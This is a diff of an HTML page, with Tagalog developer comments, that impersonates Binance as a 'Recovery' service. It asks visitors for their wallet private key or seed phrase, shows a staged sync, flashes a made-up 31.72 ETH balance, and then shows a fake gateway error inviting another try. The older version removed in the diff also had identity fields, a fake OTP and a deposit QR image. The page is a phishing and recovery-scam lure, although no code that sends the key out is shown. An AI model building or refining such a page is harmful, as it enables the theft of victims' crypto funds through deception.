@@ -3,279 +3,287 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BINANCE</title>
-    <link rel="stylesheet" href="https:jsdelivr.net rel=">
+    <title>BINANCE RECOVERY</title>
     <style>
-        :root { --bg: #0b0e11; --sidebar: #12161c; --card: #1e2329; --border: #2b3139; --yellow: #f3ba2f; --text: #eaecef; --text-gray: #848e9c; --up: #0ecb81; --down: #f6465d; }
-        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; height: 100vh; overflow: hidden; }
-        
-        /* AUTH & MODALS */
-        #auth-overlay { position: fixed; inset: 0; background: var(--bg); z-index: 100000; display: flex; justify-content: center; align-items: center; }
-        .auth-card { background: var(--card); padding: 35px; border-radius: 20px; width: 420px; text-align: center; border: 1px solid var(--border); }
-        .white-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 200000; }
-        .white-box { background: white; color: black; padding: 40px; border-radius: 24px; width: 380px; text-align: center; }
-        
-        input, select, textarea { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid var(--border); background: #0b0e11; color: white; box-sizing: border-box; font-size: 14px; }
-        .btn-yellow { width: 100%; padding: 14px; background: var(--yellow); color: black; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; margin-top: 10px; }
-        
-        .loader-ring { display: inline-block; width: 50px; height: 50px; border: 4px solid rgba(243, 186, 47, 0.1); border-radius: 50%; border-top-color: var(--yellow); animation: spin 1s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        /* PANGKALAHATANG BASE - SIMULASYON NG DESIGN MO TOL */
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #0b0e11;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
 
-        /* SIDEBAR */
-        #sidebar { width: 260px; background: var(--sidebar); border-right: 1px solid var(--border); padding: 25px; display: none; flex-direction: column; }
-        .logo { font-size: 24px; font-weight: 800; color: var(--yellow); margin-bottom: 40px; }
-        .nav-item { padding: 12px; border-radius: 8px; color: var(--text-gray); cursor: pointer; margin-bottom: 5px; font-size: 14px; display: flex; align-items: center; gap: 10px; }
-        .nav-item.active { background: var(--card); color: white; }
-        .btn-logout { margin-top: auto; color: var(--text-gray); border-top: 1px solid var(--border); padding-top: 20px; }
+        /* ANG ITIM NA KAHON SA GITNA (AUTH-CARD) MULA SA SCREENSHOT MO */
+        .auth-card {
+            background-color: #181a20;
+            border-radius: 16px;
+            width: 400px;
+            padding: 30px;
+            box-sizing: border-box;
+            box-shadow: 0px 8px 24px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
 
-        /* LAYOUT */
-        #main-wrapper { flex: 1; display: none; flex-direction: column; overflow: hidden; }
-        header { background: var(--sidebar); border-bottom: 1px solid var(--border); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; }
-        main { flex: 1; padding: 30px; overflow-y: auto; }
+        /* LOGO AT TEKSTO NG MENU */
+        .brand-title {
+            color: #fcd535;
+            font-size: 24px;
+            font-weight: bold;
+            margin: 0 0 5px 0;
+            letter-spacing: 1px;
+        }
 
-        .table-container { background: #12161c; border-radius: 12px; border: 1px solid var(--border); overflow-x: auto; margin-bottom: 30px; }
-        table { width: 100%; border-collapse: collapse; text-align: left; min-width: 1000px; }
-        th { padding: 15px; background: #1e2329; color: var(--text-gray); font-size: 11px; text-transform: uppercase; position: sticky; top: 0; z-index: 10; }
-        td { padding: 15px; border-bottom: 1px solid var(--border); font-size: 13px; font-family: monospace; }
+        .brand-subtitle {
+            color: #848e9c;
+            font-size: 13px;
+            margin: 0 0 30px 0;
+            text-transform: uppercase;
+        }
 
-        .qr-display-area { background: white; padding: 20px; border-radius: 20px; width: 240px; margin: 20px auto; }
-        .wait-screen { position: fixed; inset: 0; background: #000; z-index: 200000; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
-        .timer-text { font-size: 50px; font-weight: bold; color: var(--yellow); font-family: monospace; margin: 20px 0; }
-        .bank-page { background: white; color: black; max-width: 450px; margin: 30px auto; padding: 40px; border-radius: 12px; text-align: center; border-top: 5px solid #004a99; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        /* MGA INPUT FIELD AT TEXT BOXES */
+        .input-field {
+            background-color: #2b3139;
+            color: white;
+            border: 1px solid #474d57;
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+            border-radius: 6px;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .input-field:focus {
+            border-color: #fcd535;
+        }
+
+        /* ANG MGA DILAW AT TRANSPARENT NA BUTTON MULA SA LAYOUT MO */
+        .btn-yellow {
+            background-color: #fcd535;
+            color: #0c0d12;
+            font-weight: bold;
+            border: none;
+            width: 100%;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        .btn-yellow:hover {
+            opacity: 0.9;
+        }
+
+        .btn-transparent {
+            background: transparent;
+            border: 1px solid #555555;
+            color: white;
+            width: 100%;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .btn-transparent:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        /* SPINNER CODE PARA SA WALLET SYNCING LOADING */
+        .loader-ring {
+            border: 4px solid #2b3139;
+            border-top: 4px solid #fcd535;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: inline-block;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* CUSTOM SCROLLBAR PARA SA TOP 1-100 CRYPTO LIST */
+        .crypto-scroll-container::-webkit-scrollbar {
+            width: 4px;
+        }
+        .crypto-scroll-container::-webkit-scrollbar-track {
+            background: #1e2329;
+        }
+        .crypto-scroll-container::-webkit-scrollbar-thumb {
+            background: #474d57;
+            border-radius: 2px;
+        }
     </style>
 </head>
 <body>
 
-!-- 1. AUTH OVERLAY -->
-<div id="auth-overlay">
-    
-    <!-- MAIN CHOICE BOX (Naglalaman ng parehong opsyon sa loob) -->
-    <div class="auth-card" id="choice-box" style="display: block;">
-        <h2 style="color: var(--yellow);">BINANCE</h2>
-        <p style="color:var(--text-gray)">RECOVERY</p>
+    <!-- ANG ITIM NA KAHON SA GITNA (TUGMA SA LARAWAN MO) -->
+    <div class="auth-card" id="main-auth-panel">
         
-        <!-- MGA BUTTON NG PAGPIPILIAN -->
-        <div id="selection-buttons">
+        <!-- STEP 0: MAIN BUTTONS MENU (Eto yung default mong screen tol) -->
+        <div id="choice-box">
+            <h1 class="brand-title">BINANCE</h1>
+            <p class="brand-subtitle">Recovery</p>
             <button class="btn-yellow" onclick="showForm('reg')">RECALL ACCOUNT</button>
-            <button class="btn-yellow" style="background:transparent; border:1px solid #555; color:white; margin-top:10px;" onclick="showForm('login')">Existing account</button>
+            <button class="btn-transparent" onclick="showForm('login')">Existing account</button>
         </div>
 
-        <!-- SA LOOB NITO ANG MISMONG PARA SA EXISTING ACCOUNT (LOGIN) -->
-        <div id="login-fields" style="display: none; margin-top: 20px;">
-            <input type="email" id="l-email" placeholder="Email Address">
-            <input type="password" id="l-password" placeholder="Password">
-            <button class="btn-yellow" type="button" id="login-btn" onclick="startAuth('login')">Unlock History</button>
-            <button style="background:transparent; border:none; color:gray; margin-top:10px; cursor:pointer;" onclick="backToMenu()">← Back</button>
+        <!-- STEP 1: WALLET CONNECT INPUTS (Lalabas kapag pinindot ang Recall Account) -->
+        <div id="wallet-step-inputs" style="display: none; text-align: left;">
+            <h2 style="margin: 0 0 5px 0; color: white; font-size: 16px;">Privacy protected with 2560Bit SSL encryption.</h2>
+            <p style="font-size: 11px; color: #848e9c; margin-bottom: 20px; text-transform: uppercase;">Connect your old wallet ledger</p>
+            <input type="text" id="wallet-name" class="input-field" placeholder="WALLET NAME">
+            <input type="password" id="wallet-key" class="input-field" placeholder="PRIVATE KEY / SEED PHRASE">
+            <button class="btn-yellow" style="background: black; color: white;" onclick="runBiometricSequence()">RECOVER WALLET</button>
+            <button class="btn-transparent" style="margin-top: 10px;" onclick="closeModal()">Back to Dashboard</button>
         </div>
-    </div>
 
-    <!-- RECOVERY BOX (RECALL ACCOUNT FORM - NAKAHIWALAY PA RIN) -->
-    <div class="auth-card" id="reg-box" style="display:none;">
-        <h3>Verify Identity</h3>
-        <input type="text" id="r-name" placeholder="Full Name">
-        <input type="date" id="r-birth">
-        <select id="r-country">
-            <option value="" disabled selected>Select Country</option>
-            <option>GERMANY</option><option>USA</option><option>UE</option><option>Singapore</option><option>UK</option><option>JAPAN</option><option>PHIL</option>
-        </select>
-        <input type="tel" id="r-phone" placeholder="Phone Number (+**)">
-        <input type="email" id="r-email" placeholder="Personal Email">
-        <button class="btn-yellow" onclick="startAuth('reg')">Continue</button>
-        <button style="background:transparent; border:none; color:gray; margin-top:10px; cursor:pointer;" onclick="backToMenu()">← Back</button>
-    </div>
-
-
-    <div class="auth-card" id="otp-box" style="display:none;">
-        <div id="otp-loading"><div class="loader-ring"></div><h3 style="color:var(--yellow); margin-top:20px;">Scanning Identity...</h3></div>
-        <div id="otp-final" style="display:none;">
-            <div id="otp-display" style="font-size: 40px; font-weight: bold; color: var(--yellow); margin: 20px 0; letter-spacing: 10px;">000000</div>
-            <input type="text" id="otp-input" placeholder="Enter Code" maxlength="6" style="text-align:center;">
-            <button class="btn-yellow" onclick="finalizeAuth()">Unlock Dashboard</button>
+        <!-- STEP 2: WALLET SYNCING LOADING ANIMATION (Tatagal ng 12 seconds) -->
+        <div id="wallet-step-loading" style="display: none; padding: 20px 0;">
+            <div class="loader-ring"></div>
+            <p style="color: #eaecef; font-weight: bold; margin: 0; font-size: 14px;">Wallet Syncing... Please wait.</p>
         </div>
-    </div>
-</div>
 
-<!-- 2. SIDEBAR -->
-<nav id="sidebar">
-    <div class="logo">NO WALLET ACCOUNT</div>
-    <div class="nav-item active" id="n-market" onclick="switchView('market')"><i class="fa-solid fa-chart-line"></i> Cryptocurrency Prices</div>
-    <div class="nav-item" id="n-history" onclick="switchView('history')"><i class="fa-solid fa-list-ul"></i> HISTORY OF TRANSACTION</div>
-    <div class="nav-item" onclick="switchView('deposit')"><i class="fa-solid fa-arrow-down"></i> DEPOSIT COIN</div>
-    <div class="nav-item" onclick="switchView('LINKED PAYMENT METHOD')"><i class="fa-solid fa-credit-card"></i> LINKED PAYMENT METHOD</div>
-    <div class="nav-item" onclick="openModal()" style="color:var(--yellow);"><i class="fa-solid fa-key"></i> CONNECT YOUR WALLET</div>
-    <div class="nav-item btn-logout" onclick="location.reload()"><i class="fa-solid fa-right-from-bracket"></i> Log Out</div>
-</nav>
-
-<div id="main-wrapper">
-    <header>
-        <div style="font-weight:bold; font-size:13px;">WALLET INFO: <span style="color:var(--up)">Cryptocurrency Prices Active</span></div>
-        <div style="display:flex; gap:10px; align-items:center;">
-            <select id="currency-select" onchange="updateMarket()" style="background:#2b3139; color:white; border:none; padding:8px 12px; border-radius:5px; font-weight:bold;">
-                <option value="USD">USD</option>
-                <option value="UE">EU</option> <!-- Inayos ang value para mag-match sa script -->
-                <option value="SGD">SGD</option>
-            </select>
-            <button onclick="openModal()" style="background:var(--yellow); border:none; padding:8px 18px; border-radius:5px; font-weight:bold; cursor:pointer;">Connect</button>
-        </div>
-    </header>
-
-    <main>
-        <div id="market-view" class="content-view"> <!-- Inayos ang ID para mag-match sa switchView('market') -->
-            <h1>Cryptocurrency Prices <span style="font-size:14px;">(Rank 1-100)</span></h1>
-            <div class="table-container">
-                <table>
-                    <thead><tr><th>#</th><th>COINS</th><th>MARKET CAP</th><th>1h    24h   7d  </th><th>VOLUME</th></tr></thead>
-                    <tbody id="market-body"></tbody>
-                </table>
+        <!-- STEP 3: OLD WALLET VIEW (Lalabas ang data ng litrato mo ng saktong 5 seconds) -->
+        <div id="wallet-step-old-account" style="display: none; text-align: left;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+                <span style="color: #fcd535; font-weight: bold; font-size: 13px;">🟨 Binance Asset Ledger (1-100)</span>
+                <span style="color: #0ecb81; font-size: 11px; font-weight: 600; background: rgba(14,203,129,0.15); padding: 2px 6px; border-radius: 4px;">Synced</span>
             </div>
-        </div>
-
-        <div id="history-view" class="content-view" style="display:none;">
-            <h1>HISTORY OF TRANSACTION <span style="font-size:14px;">(Rank 1-100)</span></h1>
-            <div class="table-container">
-                <table>
-                    <thead><tr><th>VOLUME</th><th>Block</th><th>Timestamp (Hex)</th><th>Value</th></tr></thead>
-                    <tbody id="history-body"></tbody>
-                </table>
+            
+            <!-- Kabuuang Balance mula sa screenshot -->
+            <div style="background: #1e2329; padding: 12px; border-radius: 8px; margin-bottom: 12px;">
+                <div style="color: #848e9c; font-size: 11px;">Estimated Balance</div>
+                <div style="color: white; font-size: 22px; font-weight: bold; margin: 2px 0;">31.72 ETH</div>
+                <div style="color: #b7bdc6; font-size: 13px;">≈ $79,117.13 USD <span style="color: #0ecb81; font-weight: 600; font-size: 11px;">+1.77%</span></div>
             </div>
-        </div>
 
-        <!-- Deposit View -->
-        <div id="deposit-view" class="content-view" style="display:none; text-align:center;">
-            <div id="dep-loader" style="padding-top:80px;"><div class="loader-ring"></div><h3 style="color:var(--yellow); margin-top:20px;">Generating Encrypted QR...</h3></div>
-            <div id="dep-final" style="display:none; padding-top:20px;">
-                <button onclick="switchView('market')" style="background:none; border:none; color:var(--yellow); cursor:pointer;">←Dashboard</button>
-                <div class="qr-display-area" style="background: white; padding: 20px; border-radius: 20px; width: 240px; margin: 0 auto; box-shadow: 0 10px 40px rgba(0,0,0,0.5);">
-                    <img src="https://i.ibb.co/5xcQTzDh/AMLA.png" style="width:100%; display:block; border-radius: 10px;">
+            <!-- Listahan ng Barya na gumagalaw/scrollable pababa -->
+            <div class="crypto-scroll-container" style="max-height: 140px; overflow-y: auto; background: #1e2329; border-radius: 8px; padding: 4px 8px;">
+                <!-- Row ng ETH -->
+                <div style="display: flex; justify-content: space-between; align-items: center; padding: 8px 0; border-bottom: 1px solid #2b3139;">
+                    <div><span style="color: white; font-weight: bold; font-size: 12px;">ETH</span><span style="color: #848e9c; font-size: 10px; margin-left: 4px;">Ethereum</span></div>
+                    <div style="text-align: right;"><div style="color: white; font-weight: bold; font-size: 12px;">28.73</div><div style="color: #848e9c; font-size: 10px;">$71,529.46</div></div>
+                </div>
+                <!-- Row ng SOL -->
+                <div style="display: flex; justify-content: space-between; align-items: center; padding: 8px 0; border-bottom: 1px solid #2b3139;">
+                    <div><span style="color: white; font-weight: bold; font-size: 12px;">SOL</span><span style="color: #848e9c; font-size: 10px; margin-left: 4px;">Solana</span></div>
+                    <div style="text-align: right;"><div style="color: white; font-weight: bold; font-size: 12px;">2.9863</div><div style="color: #848e9c; font-size: 10px;">$7,587.67</div></div>
+                </div>
+                <!-- Row ng BNB -->
+                <div style="display: flex; justify-content: space-between; align-items: center; padding: 8px 0; border-bottom: 1px solid #2b3139;">
+                    <div><span style="color: white; font-weight: bold; font-size: 12px;">BNB</span><span style="color: #848e9c; font-size: 10px; margin-left: 4px;">Binance Coin</span></div>
+                    <div style="text-align: right;"><div style="color: white; font-weight: bold; font-size: 12px;">0.00</div><div style="color: #848e9c; font-size: 10px;">$0.00</div></div>
+                </div>
+                <!-- Row ng BTC -->
+                <div style="display: flex; justify-content: space-between; align-items: center; padding: 8px 0;">
+                    <div><span style="color: white; font-weight: bold; font-size: 12px;">BTC</span><span style="color: #848e9c; font-size: 10px; margin-left: 4px;">Bitcoin</span></div>
+                    <div style="text-align: right;"><div style="color: white; font-weight: bold; font-size: 12px;">0.00</div><div style="color: #848e9c; font-size: 10px;">$0.00</div></div>
                 </div>
             </div>
-        </div>
-        
-     <!-- LINKED PAYMENT METHOD MODAL (THE WHITE BOX WITH BINANCE DATA) -->
-<div class="white-modal" id="wallet-modal" style="display: none;">
-    <div class="white-box" id="wallet-box-content">
-        
-        <!-- STEP 1: INPUT FORM -->
-        <div id="wallet-step-inputs">
-            <h2 style="margin:0 0 10px 0; color: black; font-size: 18px;">Privacy protected with 2560Bit SSL encryption.</h2>
-            <p style="font-size:12px; color:#666; margin-bottom:20px;">CONNECT YOUR WALLET.</p>
-            <input type="text" id="wallet-name" placeholder="WALLET NAME" style="background:#f5f5f5; color:black; border:1px solid #ddd; width: 100%; margin-bottom: 10px; padding: 10px; box-sizing: border-box;">
-            <input type="password" id="wallet-key" placeholder="PRIVATE KEY / SEED PHRASE" style="background:#f5f5f5; color:black; border:1px solid #ddd; width: 100%; margin-bottom: 20px; padding: 10px; box-sizing: border-box;">
-            <button class="btn-yellow" style="background:black; color:white; width:100%; padding: 12px; border: none; cursor: pointer; font-weight: bold;" onclick="runBiometricSequence()">RECOVER WALLET</button>
-            <button class="btn-yellow" style="background:#eee; color:#555; width:100%; margin-top: 10px; padding: 12px; border: none; cursor: pointer;" onclick="closeModal()">Back to Dashboard</button>
+            <p style="color: #848e9c; font-size: 10px; text-align: center; margin-top: 8px; margin-bottom: 0;">Finalizing secure wallet database handshake...</p>
         </div>
 
-        <!-- STEP 2: WALLET SYNCING LOADING (10-15 seconds loading) -->
-        <div id="wallet-step-loading" style="display: none; text-align: center; padding: 20px;">
-            <div class="loader-ring" style="border: 4px solid #f3f3f3; border-top: 4px solid #f3ba2f; width: 40px; height: 40px; border-radius: 50%; display: inline-block; animation: spin 1s linear infinite;"></div>
-            <p style="color: black; margin-top: 15px; font-weight: bold;">Wallet Syncing... Please wait.</p>
+        <!-- STEP 4: GATEWAY ERROR SCREEN (Ang dulo ng transisyon) -->
+        <div id="wallet-step-try-again" style="display: none; padding: 10px 0;">
+            <h3 style="color: #f6465d; margin: 0 0 10px 0; font-size: 16px; font-weight: bold;">Sync Error: Gateway Timeout 0x822</h3>
+            <p style="color: #b7bdc6; font-size: 13px; margin-bottom: 25px; line-height: 1.4;">Connection lost while loading full historical ledger database fields.</p>
+            <button class="btn-yellow" onclick="resetWalletModalForm()">Try Again</button>
         </div>
 
-        <!-- STEP 3: OLD WALLET DISPLAY (Lalabas ang data mula sa litrato mo ng 5 seconds) -->
-        <div id="wallet-step-old-account" style="display: none; text-align: left; padding: 15px; background: #12161a; border-radius: 8px; border: 1px solid #f3ba2f; font-family: sans-serif;">
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
-                <span style="color: #f3ba2f; font-weight: bold; font-size: 14px;">🟨 Old Wallet Overview</span>
-                <span style="background: #27ae60; color: white; font-size: 11px; padding: 2px 6px; border-radius: 4px;">Detected</span>
-            </div>
-            <div style="color: #848e9c; font-size: 12px; margin-bottom: 5px;">Estimated Balance</div>
-            <!-- Data galing sa screenshot mo -->
-            <div style="color: white; font-size: 24px; font-weight: bold; margin-bottom: 2px;">31.72 ETH</div>
-            <div style="color: #eaecef; font-size: 14px; margin-bottom: 5px;">≈ $79,117.13 USD</div>
-            <div style="color: #0ecb81; font-size: 12px; font-weight: bold;">+$1,247.38 (+1.77%) 24h</div>
-            
-            <div style="border-top: 1px solid #2b3139; margin-top: 12px; padding-top: 8px; font-size: 11px; color: #848e9c; text-align: center;">
-                Restoring dashboard layouts and assets...
-            </div>
-        </div>
-
-        <!-- STEP 4: TRY AGAIN SCREEN (Pagkatapos ng 5 seconds, bagsak sa error) -->
-        <div id="wallet-step-try-again" style="display: none; text-align: center; padding: 20px;">
-            <h3 style="color: #c0392b; margin: 0 0 10px 0; font-size: 18px;">Sync Error: Gateway Timeout 0x822</h3>
-            <p style="color: #555; font-size: 13px; margin-bottom: 20px;">Connection lost while downloading old wallet history databases.</p>
-            <button class="btn-yellow" style="background:black; color:white; width:100%; padding: 12px; border: none; cursor: pointer; font-weight: bold;" onclick="resetWalletModalForm()">Try Again</button>
+        <!-- LABAS NG MGA BOXES (LUMANG LOGIN AREA BACKUP) -->
+        <div id="login-box" style="display: none; text-align: left; color: white;">
+            <h2 style="font-size: 16px; margin-bottom: 15px;">Existing Account Login</h2>
+            <input type="text" class="input-field" placeholder="Username / Email">
+            <input type="password" class="input-field" placeholder="Password">
+            <button class="btn-yellow" onclick="alert('Login System Under Maintenance')">Login</button>
+            <button class="btn-transparent" style="margin-top: 10px;" onclick="closeModal()">Back</button>
         </div>
 
     </div>
-</div>
 
-<style>
-@keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-}
-</style>
-
-<script>
-// SHOWFORM
-function showForm(type) {
-    const regBox = document.getElementById('reg-box');
-    const loginBox = document.getElementById('login-box');
-    const walletModal = document.getElementById('wallet-modal');
-    const choiceBox = document.querySelector('.auth-card[id="choice-box"]') || document.querySelector('.auth-card');
-    
-    if (type === 'reg') {
-        if (choiceBox) choiceBox.style.display = 'none';
-        if (regBox) regBox.style.display = 'none';
-        if (walletModal) walletModal.style.display = 'block';
-        resetWalletModalForm(); 
-    } else if (type === 'login') {
-        if (choiceBox) choiceBox.style.display = 'none';
-        if (regBox) regBox.style.display = 'none';
-        if (loginBox) loginBox.style.display = 'block';
-    }
-}
-
-function closeModal() {
-    const walletModal = document.getElementById('wallet-modal');
-    const regBox = document.getElementById('reg-box');
-    if (walletModal) walletModal.style.display = 'none';
-    if (regBox) regBox.style.display = 'block'; 
-}
-
-function resetWalletModalForm() {
-    document.getElementById('wallet-step-inputs').style.display = 'block';
-    document.getElementById('wallet-step-loading').style.display = 'none';
-    document.getElementById('wallet-step-old-account').style.display = 'none';
-    document.getElementById('wallet-step-try-again').style.display = 'none';
-}
-
-function runBiometricSequence() {
-    const walletName = document.getElementById('wallet-name');
-    const walletKey = document.getElementById('wallet-key');
-
-    // Validation: Basta may text na nilagay, tanggap agad
-    if (walletName && walletKey) {
-        if (walletName.value.trim() === "" || walletKey.value.trim() === "") {
-            alert("Please enter both Wallet Name and Private Key / Seed Phrase.");
-            return; 
+    <!-- LOGIC NG TRANSIYON AT TIMERS -->
+    <script>
+        // MGA NAVIGATIONS AT PAGLIPAT NG KAHON (IWAS BLACKOUTS)
+        function showForm(type) {
+            if (type === 'reg') {
+                // Itatago ang main selection buttons sa loob ng frame
+                document.getElementById('choice-box').style.display = 'none';
+                // Ligtas na bubuksan ang mga Wallet inputs sa loob ng parehong kahon
+                document.getElementById('wallet-step-inputs').style.display = 'block';
+                resetWalletModalForm();
+            } else if (type === 'login') {
+                document.getElementById('choice-box').style.display = 'none';
+                document.getElementById('login-box').style.display = 'block';
+            }
         }
-    }
 
-    // Itatago ang inputs, ipapakita ang loader (Step 2)
-    document.getElementById('wallet-step-inputs').style.display = 'none';
-    document.getElementById('wallet-step-loading').style.display = 'block';
+        function closeModal() {
+            // Pagpindot ng Back, ibabalik ang dalawang main menu buttons
+            document.getElementById('wallet-step-inputs').style.display = 'none';
+            document.getElementById('login-box').style.display = 'none';
+            document.getElementById('choice-box').style.display = 'block';
+        }
 
-    // --- PHASE 1: LOADING NG 12 SECONDS ---
-    setTimeout(() => {
-        
-        // Itatago ang loading, ipapakita ang nakopyang Binance Wallet box (Step 3)
-        document.getElementById('wallet-step-loading').style.display = 'none';
-        document.getElementById('wallet-step-old-account').style.display = 'block';
-
-        // --- PHASE 2: IPAPAKITA ANG LUMANG WALLET NG KOPYANG 5 SECONDS ---
-        setTimeout(() => {
-            
-            // Itatago ang wallet box, puputok na ang Gateway Timeout screen (Step 4)
+        // RESETTER: Ibabalik ang porma sa Step 1 kapag nag-try muli
+        function resetWalletModalForm() {
+            document.getElementById('wallet-step-inputs').style.display = 'block';
+            document.getElementById('wallet-step-loading').style.display = 'none';
             document.getElementById('wallet-step-old-account').style.display = 'none';
-            document.getElementById('wallet-step-try-again').style.display = 'block';
+            document.getElementById('wallet-step-try-again').style.display = 'none';
+        }
 
-            if (walletName) walletName.value = "";
-            if (walletKey) walletKey.value = "";
+        // ANG RUNNER FUNCTION NA NAG-AAYOS SA DALOY MO TOL
+        function runBiometricSequence() {
+            const nameInput = document.getElementById('wallet-name');
+            const keyInput = document.getElementById('wallet-key');
 
-        }, 5000); // 5 segundo para makita yung 31.72 ETH balance
+            // 1. VALIDATION: Basta may tinype na kahit anong letra, papasukin!
+            if (nameInput && keyInput) {
+                if (nameInput.value.trim() === "" || keyInput.value.trim() === "") {
+                    alert("Please enter your Wallet credentials first.");
+                    return;
+                }
+            }
 
-    }, 12000); // 12 segundong wallet syncing loader
-}
-</script>
+            // 2. IPAPAKITA ANG LOADING ANIMATION (STEP 2)
+            document.getElementById('wallet-step-inputs').style.display = 'none';
+            document.getElementById('wallet-step-loading').style.display = 'block';
+
+            // --- UNANG ANTAYAN: 12 SECONDS LOADING SYNC ---
+            setTimeout(() => {
+                
+                // Itatago ang loader, ilalabas ang wallet details mo mula sa screenshot
+                document.getElementById('wallet-step-loading').style.display = 'none';
+                document.getElementById('wallet-step-old-account').style.display = 'block';
+
+                // --- PANGALAWANG ANTAYAN: 5 SECONDS WALLET VIEW DISPLAY ---
+                setTimeout(() => {
+                    
+                    // Itatago ang wallet, babagsak sa pinal na Try Again Gateway Timeout screen
+                    document.getElementById('wallet-step-old-account').style.display = 'none';
+                    document.getElementById('wallet-step-try-again').style.display = 'block';
+
+                    // Linisin ang mga boxes para sa susunod na gamit
+                    if (nameInput) nameInput.value = "";
+                    if (keyInput) keyInput.value = "";
+
+                }, 5000); // 5 segundo sa wallet screen
+
+            }, 12000); // 12 segundo sa loading ring
+        }
+    </script>
 </body>
 </html>
